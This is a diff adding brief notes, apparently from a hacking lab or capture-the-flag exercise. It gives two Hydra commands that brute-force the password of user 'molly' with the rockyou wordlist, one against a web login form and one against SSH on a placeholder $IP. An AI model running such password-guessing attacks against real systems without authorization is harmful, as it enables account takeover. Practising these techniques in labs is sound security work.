@@ -1,0 +1,9 @@
+1. Web
+```
+hydra -l molly -P /home/j03y/Tech/Hacking/rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password isincorrect."
+```
+
+2. SSH
+```
+hydra -l molly -P /home/j03y/Tech/Hacking/rockyou.txt $IP -t 8 ssh
+```
